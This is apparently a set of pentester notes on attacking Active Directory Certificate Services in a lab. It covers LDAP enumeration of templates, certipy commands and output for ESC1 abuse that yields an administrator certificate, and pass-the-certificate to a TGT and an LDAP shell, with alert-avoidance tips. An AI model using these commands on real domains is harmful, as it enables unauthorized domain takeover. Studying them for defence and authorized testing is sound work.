# ADCS

## List Enrollment Services

Enrollment services describe the machines that allow to resolve certificate
requests in a domain. We can find those under the container
`CN=Enrollment Services,CN=Public Key
Services,CN=Services,CN=Configuration,DC=<domain>,DC=<tld>`. These LDAP entries
are of the type `pKIEnrollmentService` and include the following information:

- The CA info like name and certificate. Attribute `cn` and `cACertificate`.
- The server providing the enrollment. Attributes `dNSHostName` and
  `msPKI-Enrollment-Servers`.
- The supported certificate templates. Attribute `certificateTemplates`.

We can retrive the enrollment services with a LDAP query like the following:
- Base: `CN=Configuration,DC=<domain>,DC=<tld>`
- Scope: Subtree
- Filter: `(objectclass=pKIEnrollmentService)`

```
ldapsearch -LLL -x -H ldaps://dc01.hack.lab -D user@hack.lab -w 'P4ssw0rd' \
-b 'CN=Configuration,DC=hack,DC=lab' \
-s sub \
"(objectclass=pKIEnrollmentService)"
```

or:
- Base `CN=Enrollment Services,CN=Public Key
  Services,CN=Services,CN=Configuration,DC=<domain>,DC=<tld>`
- Scope: One sublevel

```
ldapsearch -LLL -x -H ldaps://dc01.hack.lab -D user@hack.lab -w 'P4ssw0rd' \
-b 'CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=hack,DC=lab' \
-s one
```

> **Tool way**:
> - [certipy LDAP query to retrieve enrollment services](https://github.com/ly4k/Certipy/blob/a80fe7c88d9e1a6c4cfec3732fca9ec440d5ed9d/certipy/commands/find.py#L223)
> - [Certify LDAP query to retrieve enrollment services](https://github.com/GhostPack/Certify/blob/d19679ead399f4d853e103541db40f39975617cf/Certify/Lib/LdapOperations.cs#L101)

## List certificate templates

Certificate templates indicate the conditions that have to be meet to request
certificates to the enrollment service. If those are misconfigured, can lead to
privilege escalation in the AD environment.

We can find the certificate templates under the `CN=Certificate Templates,CN=Public Key
Services,CN=Services,CN=Configuration,DC=<domain>,DC=<tld>` LDAP container.
- **msPKI-Certificate-Name-Flag**: A number whose bits indicates some requirements
  for the user requesting the certificate. Here are some of most interesting:
  + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (0x1): The user can supply the subject
    of the certificate, this means indicating the entity to which the
    certificate is intended to. This makes sense when requesting a certificate
    for a web server, since it allows to indicate the domain, but in AD it also
    means this could be used to request a certificate for another user.


- [msPKI-Enrollment-Flag](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/ec71fd43-61c2-407b-83c9-b52272dec8a1): A number whose bits indicates some conditions that
  must be met to issue the certificate. Here are some of the most interesting ones:
  + **CT_FLAG_PEND_ALL_REQUESTS** (0x2): Requires manager approval

- [msPKI-RA-Signature](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/160d0057-bfa9-46c5-a839-72e7588f0420): The number of signatures required in the CSR to issue
  the certificate.
- [msPKI-Template-Schema-Version](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/bf5bd40c-0d4d-44bd-870e-8a6bdea3ca88): The version of the certificate template.

- **pKIExtendedKeyUsage**: Indicates how the certificate can be used. It is a lists
  of OID (Object Identifiers), each one indicating and available use. If none is
  specified, then the certificate can be used for any purpose. Here are some
  interesting values:
  + Any purpose (2.5.29.37.0)
  + Client Authentication (1.3.6.1.5.5.7.3.2): Allows authentication.
  + PKINIT Client Authentication (1.3.6.1.5.2.3.4): Allows authentication.
  + Smart Card Logon (1.3.6.1.4.1.311.20.2.2): Allows authentication.
  + Certificate Request Agent (OID 1.3.6.1.4.1.311.20.2.1): Allows to use the
    certificate to request certificates for other users.

We can use an LDAP query like this to retrieve the certificate templates:
- Base: `CN=Certificate Templates,CN=Public Key
  Services,CN=Services,CN=Configuration,DC=<domain>,DC=<tld>`
- Scope: One level

```
ldapsearch -LLL -x -H ldaps://dc01.hack.lab -D user@hack.lab -w 'P4ssw0rd' \
-b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=hack,DC=lab' \
-s one
```

Another option is to use the following LDAP query:
- Base: `CN=Configuration,DC=<domain>,DC=<tld>`
- Scope: Subtree
- Filter: `(objectclass=pKICertificateTemplate)`

```
ldapsearch -LLL -x -H ldaps://dc01.hack.lab -D user@hack.lab -w 'P4ssw0rd' \
-b 'CN=Configuration,DC=hack,DC=lab' \
-s sub \
"(objectclass=pKICertificateTemplate)"
```

> **Tool way**: 
> - [certipy LDAP query to retrieve certificate templates](https://github.com/ly4k/Certipy/blob/a80fe7c88d9e1a6c4cfec3732fca9ec440d5ed9d/certipy/commands/find.py#L189)
> - [Certify LDAP query to retrieve certificate templates](https://github.com/GhostPack/Certify/blob/d19679ead399f4d853e103541db40f39975617cf/Certify/Lib/LdapOperations.cs#L171)


## Search vulnerable templates

We can use `certipy` to search for vulnerable templates in ADCS:
```
$ certipy find -u user@hack.lab -p 'P4ssw0rd' -dc-only
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[*] Saving text output to '20251109155853_Certipy.txt'
[*] Wrote text output to '20251109155853_Certipy.txt'
[*] Saving JSON output to '20251090155853_Certipy.json'
[*] Wrote JSON output to '20251109155853_Certipy.json'
```

We here use the flag `-dc-only` to only retrieve information about ADCS from the
domain controller, without interacting with the CAs, since this could trigger
some alerts.


## ESC1

We can use [certipy](https://github.com/ly4k/Certipy) to request a certificate providing and alternative
name. For this we need to provide the `-upn` parameter, with format
`user@domain` and the `-sid` which is the user SID.

Here is an example:
```
$ certipy req -u user@hack.lab -p 'P4ssw0rd' \
-template vuln2 -ca hack-CA01-CA -target ca01.hack.lab \
-upn administrator@hack.lab -sid S-1-5-21-3133735781-3869895037-2890850044-500
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 13
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@hack.lab'
[*] Certificate object SID is 'S-1-5-21-3133735781-3869895037-2890850044-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

## Authentication with certificate (Pass the Certificate)

### Authentication through Kerberos PKINIT

We can use the `auth` command of [certipy](https://github.com/ly4k/Certipy) to retrieve a Kerberos TGT by
authenticate with a certificate. Then we can use that TGT to retrieve the user
hash.

> **Warning**: Retrieving the NT hash of user may trigger some alerts.

Here is an example of pass the certificate with certipy (without NT retrieval):
```
$ certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.0.1 -no-hash
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@hack.lab'
[*]     SAN URL SID: 'S-1-5-21-3133735751-3840895037-2890850031-500'
[*]     Security Extension SID: 'S-1-5-21-3133735751-3840895037-2890850031-500'
[*] Using principal: 'administrator@hack.lab'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
```

You may receive the error `KDC_ERR_PADATA_TYPE_NOSUPP`, which indicates PKINIT
is not available, so we cannot ask Kerberos tickets by using a certificate. More
information on:
- [Help understanding limitations of "KDC_ERR_PADATA_TYPE_NOSUPP"](https://github.com/ly4k/Certipy/issues/64).
- [Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)


### Authentication through LDAP Schannel

In case PKINIT is not supported, we can still
[authenticate by using LDAP Schannel](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html). This allows us to perform LDAP queries
(and modifications) by using a certificate. We can do this with 
`certipy auth -ldap-shell` option:
```
$ certipy-ad auth -ldap-shell -pfx administrator.pfx -dc-ip 192.168.0.1
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@hack.lab'
[*]     SAN URL SID: 'S-1-5-21-3133735751-3840895037-2890850031-500'
[*]     Security Extension SID: 'S-1-5-21-3133735751-3840895037-2890850031-500'
[*] Connecting to 'ldaps://192.168.0.1:636'
[*] Authenticated to '192.168.0.1' as: 'u:HACK\\Administrator'
Type help for list of commands

#
```

Tools:
- [certipy](https://github.com/ly4k/Certipy)
- [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/)

Resources:
- [Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [The Hacker Recipes: Pass the Certificate](https://www.thehacker.recipes/ad/movement/schannel/passthecert)
- [MS-ADTS: LDAP Authentication Methods: Using SSL/TLS](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/8e73932f-70cf-46d6-88b1-8d9f86235e81)

## Resources

- [Certipy (tool)](https://github.com/ly4k/Certipy) by ly4k
- [PassTheCert (tool)](https://github.com/AlmondOffSec/PassTheCert/) by the-useless-one and ThePirateWhoSmellsOfSunflowers 

- [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) by Will Schroeder and Lee Christensen
- [Certipy wiki](https://github.com/ly4k/Certipy/wiki)
- [Help understanding limitations of "KDC_ERR_PADATA_TYPE_NOSUPP"](https://github.com/ly4k/Certipy/issues/64).
- 04/05/2022 [Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
  by Yannick Méheut
